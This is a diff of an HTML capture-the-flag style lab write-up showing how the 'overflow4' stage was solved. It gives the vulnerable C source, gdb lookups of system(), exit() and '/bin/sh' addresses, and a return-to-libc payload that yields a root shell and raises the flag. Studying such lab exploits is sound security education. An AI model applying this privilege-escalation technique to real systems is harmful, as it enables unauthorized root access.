@@ -11,6 +11,8 @@
 
 <p>The stages of stacklab is hosted on individual host on emory mainframe host. The purpose of this lab is to understand and use buffer overflow and shell code injection to compromise vulnerable programs, especially with unsafe buffer copy.</p>
 
+
+
 <h2 id="overflow1"><span>overflow1</span></h2>
 
 <p>This is too easy. </p>
@@ -464,3 +466,104 @@ uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">1030<
 
 
 <h2 id="overflow4"><span>overflow4</span></h2>
+
+<p>This time we are limited with the length of input, the source code looks like this:</p>
+
+
+
+<pre class="prettyprint"><code class="language-C hljs cpp"><span class="hljs-comment">/* Betrayal */</span>
+
+<span class="hljs-preprocessor">#include &lt;stdio.h&gt;</span>
+<span class="hljs-preprocessor">#include &lt;stdlib.h&gt;</span>
+<span class="hljs-preprocessor">#include &lt;unistd.h&gt;</span>
+<span class="hljs-preprocessor">#include &lt;string.h&gt;</span>
+<span class="hljs-preprocessor">#include &lt;ctype.h&gt;</span>
+
+
+<span class="hljs-keyword">void</span> brutus(<span class="hljs-keyword">char</span> *caesar)
+{
+        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>];
+
+        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(caesar) &gt; <span class="hljs-number">20</span>)
+        {
+                <span class="hljs-built_in">printf</span> (<span class="hljs-string">"Et tu, Brute?\n"</span>);
+                <span class="hljs-keyword">return</span>;
+        }
+
+        <span class="hljs-built_in">strcpy</span> (buf, caesar);
+
+        <span class="hljs-built_in">printf</span> (<span class="hljs-string">"Alea iacta est: %d\n"</span>, (<span class="hljs-keyword">int</span>)<span class="hljs-built_in">strlen</span>(buf));
+
+        <span class="hljs-keyword">return</span>;
+}
+
+
+<span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;
+
+<span class="hljs-keyword">int</span> main(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)
+{
+        <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;
+        <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)
+        {
+                <span class="hljs-built_in">printf</span> (<span class="hljs-string">"I can haz one argument?\n"</span>);
+                <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
+        }
+        <span class="hljs-comment">/* Clear all environment variables so people don't sneak nasty things into my memory &gt;:( */</span>
+        <span class="hljs-keyword">while</span> (environ[i])
+        {
+                <span class="hljs-built_in">memset</span> (environ[i], <span class="hljs-number">0</span>, <span class="hljs-built_in">strlen</span>(environ[i]));
+                i++;
+        }
+        clearenv(); <span class="hljs-comment">/* Flush out the environment table */</span>
+        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">0</span>]); i++)
+        {
+                <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isalnum</span> (argv[<span class="hljs-number">0</span>][i]) &amp;&amp; <span class="hljs-built_in">strchr</span>(<span class="hljs-string">"-_/"</span>,argv[<span class="hljs-number">0</span>][i]) == NULL)
+                        <span class="hljs-keyword">return</span> -<span class="hljs-number">2</span>;
+        }
+
+        brutus(argv[<span class="hljs-number">1</span>]);
+
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+
+}
+</code></pre>
+
+<p>But are we? <br>
+Note the length integrity check in method <code>brutus()</code></p>
+
+
+
+<pre class="prettyprint"><code class="language-C hljs cpp"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(caesar) &gt; <span class="hljs-number">20</span>)
+        {
+                <span class="hljs-built_in">printf</span> (<span class="hljs-string">"Et tu, Brute?\n"</span>);
+                <span class="hljs-keyword">return</span>;
+        }</code></pre>
+
+<p>Hmm, 20 bytes, so what about the buffer? <code>char buf[4]</code> tells us the buffer length is 4. <br>
+So let’s do the math, 20 - 4 byte of buffer- 4 bytes of <code>$ebp</code> = 12 bytes. That’s way too much for a skilled hacker like you. Another <code>return-to-libc</code> looks really promising.  <br>
+Use the previously introduced techniques to find the addresses of <code>system(), exit()</code>and <code>/bin/sh</code>. This actually never changes. </p>
+
+
+
+<pre class="prettyprint"><code class=" hljs livecodeserver">(gdb) p <span class="hljs-keyword">system</span>
+$<span class="hljs-number">1</span> = {&lt;<span class="hljs-keyword">text</span> <span class="hljs-built_in">variable</span>, no debug info&gt;} <span class="hljs-number">0xf7e4c840</span> &lt;<span class="hljs-keyword">system</span>&gt;
+(gdb) p exit
+$<span class="hljs-number">2</span> = {&lt;<span class="hljs-keyword">text</span> <span class="hljs-built_in">variable</span>, no debug info&gt;} <span class="hljs-number">0xf7e407f0</span> &lt;exit&gt;
+(gdb) find &amp;<span class="hljs-keyword">system</span>,+<span class="hljs-number">9999999</span>,<span class="hljs-string">"/bin/sh"</span>
+<span class="hljs-number">0xf7f6ed48</span>
+warning: Unable <span class="hljs-built_in">to</span> access <span class="hljs-number">16000</span> <span class="hljs-keyword">bytes</span> <span class="hljs-operator">of</span> target memory <span class="hljs-keyword">at</span> <span class="hljs-number">0xf7fc8ad0</span>, halting search.
+<span class="hljs-number">1</span> pattern found.</code></pre>
+
+<p>Craft our payload.</p>
+
+
+
+<pre class="prettyprint"><code class=" hljs tex">user@host:/c0re<span class="hljs-formula">$ /c0re/attackme4 $</span>(python -c 'print "<span class="hljs-command">\x</span>90"*8 + "<span class="hljs-command">\x</span>40<span class="hljs-command">\xc</span>8<span class="hljs-command">\xe</span>4<span class="hljs-command">\xf</span>7<span class="hljs-command">\xf</span>0<span class="hljs-command">\x</span>07<span class="hljs-command">\xe</span>4<span class="hljs-command">\xf</span>7<span class="hljs-command">\x</span>48<span class="hljs-command">\xed</span><span class="hljs-command">\xf</span>6<span class="hljs-command">\xf</span>7"')
+Alea iacta est: 20
+<span class="hljs-special">#</span> whoami
+root
+<span class="hljs-special">#</span> ./flagpole
+Submitting flag...
++ FLAG RAISED! :D</code></pre>
+
+<p>Damn, too easy. Your instructor needs get more creative. </p>
